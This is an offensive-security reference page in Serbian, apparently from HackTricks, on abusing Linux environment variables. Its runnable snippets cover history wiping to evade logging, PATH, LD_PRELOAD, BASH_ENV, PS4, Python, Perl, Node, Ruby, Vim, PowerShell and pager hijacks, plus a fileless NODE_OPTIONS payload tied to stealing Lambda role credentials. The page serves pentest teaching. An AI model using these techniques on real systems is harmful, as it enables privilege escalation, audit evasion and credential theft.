# Linux promenljive okruženja

{{#include ../../banners/hacktricks-training.md}}

## Globalne promenljive

Globalne promenljive će biti nasleđene od strane podređenih procesa.

Globalnu promenljivu za trenutnu sesiju možete kreirati na sledeći način:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ova promenljiva će biti dostupna vašim trenutnim sesijama i njihovim podprocesima.

Možete **ukloniti** promenljivu na sledeći način:
```bash
unset MYGLOBAL
```
## Lokalne promenljive

**Lokalnim promenljivama** može pristupati samo **trenutni shell/skripta**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Izlistavanje trenutnih promenljivih
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Sadržaj datoteka `/proc/*/environ` razdvojen je pomoću **NUL** znakova, pa su ove varijante obično lakše za čitanje:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Ako tražite **credentials** ili **zanimljivu konfiguraciju servisa** unutar nasleđenih okruženja, proverite i [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Uobičajene promenljive

Izvor: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran koji koristi **X**. Ova promenljiva je obično podešena na **:0.0**, što znači prvi ekran na trenutnom računaru.
- **EDITOR** – tekstualni editor koji korisnik preferira.
- **HISTFILESIZE** – maksimalan broj linija sadržanih u history fajlu.
- **HISTSIZE** – broj linija koje se dodaju u history fajl kada korisnik završi sesiju.
- **HOME** – vaš home direktorijum.
- **HOSTNAME** – hostname računara.
- **LANG** – vaš trenutni jezik.
- **MAIL** – lokacija korisnikovog mail spool-a. Obično **/var/spool/mail/USER**.
- **MANPATH** – lista direktorijuma u kojima se traže manual stranice.
- **OSTYPE** – tip operativnog sistema.
- **PS1** – podrazumevani prompt u bash-u.
- **PATH** – čuva putanju svih direktorijuma koji sadrže binary fajlove koje želite da izvršite navođenjem samo imena fajla, a ne relativnom ili apsolutnom putanjom.
- **PWD** – trenutni radni direktorijum.
- **SHELL** – putanja do trenutnog command shell-a (na primer, **/bin/bash**).
- **TERM** – trenutni tip terminala (na primer, **xterm**).
- **TZ** – vaša vremenska zona.
- **USER** – vaše trenutno korisničko ime.

## Zanimljive promenljive za hacking

Nije svaka promenljiva podjednako korisna. Iz ofanzivne perspektive, prioritet dajte promenljivama koje menjaju **search paths**, **startup files**, **dynamic linker behavior** ili **audit/logging**.

### **HISTFILESIZE**

**Promenite vrednost ove promenljive na 0**, tako da kada **završite sesiju**, **history fajl** (\~/.bash_history) bude **skraćen na 0 linija**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Promenite **vrednost ove promenljive na 0**, kako se komande **ne bi čuvale u istoriji u memoriji** i kako se ne bi upisivale nazad u **datoteku istorije** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Ako je **vrednost ove promenljive podešena na `ignorespace` ili `ignoreboth`**, nijedna komanda kojoj prethodi dodatni razmak neće biti sačuvana u istoriji.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Usmerite **datoteku istorije** na **`/dev/null`** ili je u potpunosti unset-ujte. Ovo je obično pouzdanije nego samo menjanje veličine istorije.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesi će koristiti ovde deklarisani **proxy** za povezivanje sa internetom putem **http** ili **https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: podrazumevani proxy za alate/protokole koji ga podržavaju.
- `no_proxy`: lista zaobilaženja (hosts/domains/CIDRs) koji treba da se povežu direktno.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Mogu se koristiti i varijante sa malim i velikim slovima, u zavisnosti od alata (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesi će verovati sertifikatima navedenim u **ovim env promenljivama**. Ovo je korisno za omogućavanje alatima kao što su **`curl`**, **`git`**, Python HTTP klijenti ili package manageri da veruju CA-u kojim upravlja napadač (na primer, kako bi interception proxy izgledao legitimno).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ako privileged wrapper/script izvršava komande **bez apsolutnih putanja**, pobeđuje **prvi direktorijum kojim upravlja attacker** u promenljivoj `PATH`. Ovo je mehanizam iza mnogih **PATH hijacks** u `sudo`, cron poslovima, shell wrapperima i prilagođenim SUID helperima. Potražite `env_keep+=PATH`, slabi `secure_path` ili wrappere koji pozivaju `tar`, `service`, `cp`, `python` itd. po imenu.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Za kompletne lance privilege-escalation koji zloupotrebljavaju `PATH`, pogledajte [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` nije samo referenca na direktorijum: mnogi alati automatski učitavaju **dotfiles**, **plugins** i **per-user configuration** iz `$HOME` ili `$XDG_CONFIG_HOME`. Ako privilegovani workflow zadrži ove vrednosti, **config injection** može biti lakši od **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Zanimljive mete uključuju `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` i datoteke specifične za alate, kao što je `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ove promenljive utiču na **dynamic linker**:

- `LD_PRELOAD`: primorava učitavanje dodatnih shared objekata najpre.
- `LD_LIBRARY_PATH`: dodaje direktorijume za pretragu biblioteka na početak liste.
- `LD_AUDIT`: učitava auditor biblioteke koje prate učitavanje biblioteka i razrešavanje simbola.

Izuzetno su korisne za **hooking**, **instrumentation** i **privilege escalation** ako ih privilegovana komanda očuva. U režimu **secure-execution** (`AT_SECURE`, npr. setuid/setgid/capabilities), loader uklanja ili ograničava mnoge od ovih promenljivih. Međutim, parser bugovi u toj ranoj fazi loadera i dalje imaju veliki uticaj jer se izvršavaju **pre** ciljnog programa.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` menja rano ponašanje glibc-a (na primer, allocator tunables) i veoma je koristan u exploit laboratorijama. Takođe je važan iz bezbednosne perspektive zato što **dynamic loader parsira ovu promenljivu veoma rano**. Greška **Looney Tunables** iz 2023. bila je dobar podsetnik da jedna environment promenljiva parsirana u loaderu može postati **primitiv za lokalnu eskalaciju privilegija** protiv SUID programa.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Ako se **Bash** pokrene **neinteraktivno**, proverava `BASH_ENV` i učitava tu datoteku pre pokretanja ciljne skripte. Kada se Bash pozove kao `sh` ili u POSIX-interaktivnom režimu, može se proveravati i `ENV`. Ovo je klasičan način da se shell wrapper pretvori u izvršavanje koda ako napadač kontroliše okruženje.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignoriše ove startup datoteke kada se **real/effective IDs razlikuju**; `-p` čuva effective ID, ali ne omogućava te startup datoteke, pa tačno ponašanje zavisi od načina na koji wrapper pokreće shell. Budite oprezni sa privileged wrapperima koji pozivaju `setuid()`/`setgid()` **pre** pokretanja Bash-a: kada se ID-jevi ponovo podudare, Bash može verovati promenljivama `BASH_ENV`, `ENV` i povezanom stanju shell-a koje bi inače bilo ignorisano.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Kada Bash radi sa omogućenim **xtrace**-om, proširuje `PS4` i ispisuje ga pre svake praćene komande. `PS4` se proširuje kao prompt, pa se **command substitution** unutar njega izvršava. Ključno je to što se xtrace može uključiti isključivo iz environment-a izvozom `SHELLOPTS=xtrace` — nije potreban `-x` u komandnoj liniji — tako da svaka Bash skripta koju žrtva pokrene postaje code execution.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` ne radi ništa dok xtrace nije aktivan (`SHELLOPTS=xtrace`, `set -x` ili `bash -x`), a Bash uklanja `SHELLOPTS` u privileged/setuid kontekstima, baš kao i `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONBREAKPOINT**

Ove promenljive menjaju način na koji se Python pokreće:

- `PYTHONPATH`: dodaje putanje za pretragu import-a na početak.
- `PYTHONHOME`: premešta stablo standardne biblioteke.
- `PYTHONSTARTUP`: izvršava datoteku pre interaktivnog prompta.
- `PYTHONINSPECT=1`: prelazi u interaktivni režim nakon završetka skripte.
- `PYTHONBREAKPOINT`: poziva `package.module.callable` (i importuje njegov modul) kada kod dođe do `breakpoint()`.<sup>[[8]](#references)</sup>

Korisne su protiv skripti za održavanje, debugger-a, shell-ova i wrapper-a koji pozivaju Python sa okruženjem kojim se može upravljati. `python -E` i `python -I` ignorišu sve `PYTHON*` promenljive.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Nedavni primer iz stvarnog sveta bio je LPE u alatu **needrestart** iz 2024. godine na Ubuntu/Debian sistemima: scanner u vlasništvu root-a kopirao je `PYTHONPATH` neprivilegovanog procesa iz `/proc/<PID>/environ`, a zatim izvršavao Python. Objavljeni exploit je postavio `importlib/__init__.so` u putanju pod kontrolom napadača, tako da je Python izvršio kod napadača tokom sopstvene inicijalizacije, pre nego što je hardkodovana skripta helper-a uopšte postala bitna.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ima podjednako korisne startup promenljive:

- `PERL5LIB`: dodaje direktorijume biblioteka na početak putanje.
- `PERL5OPT`: ubacuje switch-eve kao da se nalaze u svakoj komandnoj liniji `perl`.

Ovo može da primora **automatsko učitavanje modula** ili da promeni ponašanje interpreter-a pre nego što ciljna skripta uradi bilo šta zanimljivo. Perl ignoriše ove promenljive u kontekstima **taint / setuid / setgid**, ali su i dalje veoma važne za uobičajene wrapper-e koji se pokreću kao root, CI poslove, instalere i prilagođena sudoers pravila.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **Node.js CLI flags** svakom `node` procesu koji nasleđuje okruženje. Zbog toga je koristan protiv wrapper-a, CI poslova, Electron helper-a i sudo pravila koja na kraju pozivaju Node. Najzanimljiviji flagovi iz ofanzivne perspektive obično su:

- `--require <file>`: unapred učitava CommonJS fajl pre ciljne skripte.
- `--import <module>`: unapred učitava ES module pre ciljne skripte.

Node odbacuje neke opasne flagove u `NODE_OPTIONS`, ali su `--require` i `--import` izričito dozvoljeni i obrađuju se **pre** uobičajenih argumenata komandne linije.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Preload bez fajla sa `data:` URL-om

Kada možete da postavite `NODE_OPTIONS`, ali **ne možete da upišete fajl** na target (filesystem samo za čitanje, ograničeni API, serverless runtime itd.), `--import` prihvata `data:text/javascript,` URL, tako da se ceo payload prenosi unutar same environment varijable. JavaScript mora biti **u potpunosti URL-enkodovan** — Node parsira vrednost kao URL, pa svaki neenkodovani razmak (ili drugi neenkodovani znak) skraćuje payload i izaziva `SyntaxError`. Ovo funkcioniše na Node 20.6+ verzijama, gde je `--import` na `NODE_OPTIONS` allowlisti.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Ovo je uobičajen način da se kontrola nad `NODE_OPTIONS` pretvori u RCE na **managed cloud runtimes** čije funkcije pokreću Node. Na primer, napadač koji može da menja samo konfiguraciju Lambda funkcije (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez ažuriranja koda) može da ubaci `NODE_OPTIONS=--import data:text/javascript,<payload>` kako bi pokrenuo kod unutar funkcije i preuzeo kredencijale njene execution role. Injektovani modul se pokreće **pre** handlera, koji se nakon toga i dalje normalno izvršava.

Za udaljene gadget chain-ove koji indirektno postavljaju `NODE_OPTIONS` (na primer, prototype-pollution do RCE), pogledajte [ovu drugu stranicu](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby pruža istu klasu zloupotrebe pri pokretanju:

- `RUBYLIB`: dodaje direktorijume na početak Ruby putanje za učitavanje.
- `RUBYOPT`: ubacuje opcije komandne linije, kao što je `-r`, u svako `ruby` pozivanje.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Vulnerabilnosti **needrestart** iz 2024. godine pokazale su da ovo nije samo trik za lab: isti helper u vlasništvu root-a, koji je bio ranjiv na zloupotrebu `PYTHONPATH` promenljive, mogao je biti primoran i da pokrene Ruby sa napadačevim `RUBYLIB`-om, učitavajući `enc/encdb.so` iz napadačevog direktorijuma.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim izvršavaju Ex komande sadržane u `VIMINIT` promenljivoj (ili njenom rezervnom `EXINIT` ekvivalentu) tokom normalnog pokretanja. Ex komande uključuju `:!cmd` i `:call system(...)`, pa kontrola nad ovom promenljivom omogućava izvršavanje koda svaki put kada žrtva otvori Vim (`sudo vim` kao root, `crontab -e`, `visudo`, `git`/`less` koji pokreću `$EDITOR`, itd.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode (`vim -es`/`-Es`) preskače ove promenljive, ali ih normalno interaktivno pokretanje izvršava.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) radi na Linux/macOS sistemima (i Windowsu) i predstavlja **.NET aplikaciju**, pa nekoliko environment promenljivih pretvara svako pokretanje `pwsh` sa nasleđenim environment-om u izvršavanje koda — korisno protiv cron/systemd poslova, CI runnera i privilegovanih wrappera koji pozivaju `pwsh`.

- `PSModulePath`: PowerShell rekurzivno pretražuje svaki direktorijum u ovoj listi za `.psd1`/`.psm1` module i **automatski učitava** modul prvi put kada se referencira komanda koju on izvozi. Dodajte direktorijum na početak liste i kod na najvišem nivou vašeg modula izvršiće se prilikom importa; pošto je redosled razrešavanja *Alias → Function → Cmdlet*, eksportovana funkcija može čak da zaseni ugrađeni cmdlet koji žrtva poziva.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: premešta `powershell/Microsoft.PowerShell_profile.ps1`, koji se izvršava pri pokretanju (osim uz `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly čiji se `StartupHook.Initialize()` izvršava pre `Main` (zajednički za svaku .NET aplikaciju).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API učitava napadačku biblioteku u proces pri pokretanju (varijable putanja imaju prednost u odnosu na registry; `DOTNET_*` je noviji alias). Na Windows PowerShell 5.1 (.NET Framework) koristite `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Na Windows-u, `PSExecutionPolicyPreference=Bypass` dodatno uklanja zaštitu „unsigned scripts blocked“, tako da namenski postavljen profile/module zaista bude pokrenut. Pogledajte posvećenu stranicu za kompletne PoC-ove:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR i LESSOPEN**

Neki alati ne čitaju samo putanju iz environment-a; oni prosleđuju vrednost **shell-u**, **editoru** ili **input preprocessor-u**. Zbog toga su sledeće promenljive naročito zanimljive kada privileged wrapper pokreće `git`, `man`, `less` ili slične text viewer-e:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: biraju pager komandu.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: biraju editor komandu, često sa argumentima.
- `LESSOPEN`, `LESSCLOSE`: definišu pre/post-processore koji se pokreću kada `less` otvori fajl.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git takođe podržava **ubacivanje konfiguracije samo putem env promenljivih** bez upisivanja na disk pomoću `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Iz perspektive post-exploitation, takođe imajte na umu da nasleđena okruženja često sadrže **credentials**, **proxy settings**, **service tokens** ili **cloud keys**. Pogledajte [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) za `/proc/<PID>/environ` i traženje `systemd` `Environment=`.

### PS1

Promenite izgled svog prompta.

[**Ovo je primer**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Ovo je primer](<../images/image (897).png>)

Običan korisnik:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri posla pokrenuta u pozadini](<../images/image (740).png>)

Jedan, dva i tri posla pokrenuta u pozadini:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri posla pokrenuta u pozadini](<../images/image (145).png>)

Jedan posao u pozadini, jedan zaustavljen i poslednja komanda nije pravilno završena:

![PERL5OPT & PERL5LIB - PS1: Jedan posao u pozadini, jedan zaustavljen i poslednja komanda nije pravilno završena](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Uobičajene promenljive okruženja - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation in the glibc's ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash Variables (`PS4`) & The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Built-in breakpoint() and PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim documentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath & PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET debugging & profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
